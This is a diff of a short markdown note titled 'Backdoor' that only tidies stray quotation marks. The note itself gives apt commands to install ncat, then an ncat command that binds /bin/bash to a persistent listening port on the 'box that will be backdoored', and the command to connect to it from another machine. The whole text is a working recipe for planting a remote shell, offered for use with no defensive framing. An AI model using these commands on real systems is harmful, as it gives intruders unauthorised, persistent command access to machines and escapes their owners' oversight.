@@ -1,8 +1,8 @@
 # Backdoor 
 ## Install ncat on the local box
 ### Apt-get (Install)
-'sudo apt-get update''
-'sudo apt-get -y install ncat''
+'sudo apt-get update'
+'sudo apt-get -y install ncat'
 
 ### Apt (Install)
 'sudo apt update'
@@ -13,7 +13,7 @@
 'sudo aptitude -y install ncat'
 
 ## Local box that will be backdoored into 
-'ncat -k -nvlp <port> -e "/bin/bash" --allow <ip's go here>'
+'ncat -k -nvlp <port> -e "/bin/bash" --allow <ips go here>'
 
 ## Box that will backdoor into local machine 
 'ncat -nv <ip address of local box> <port>'
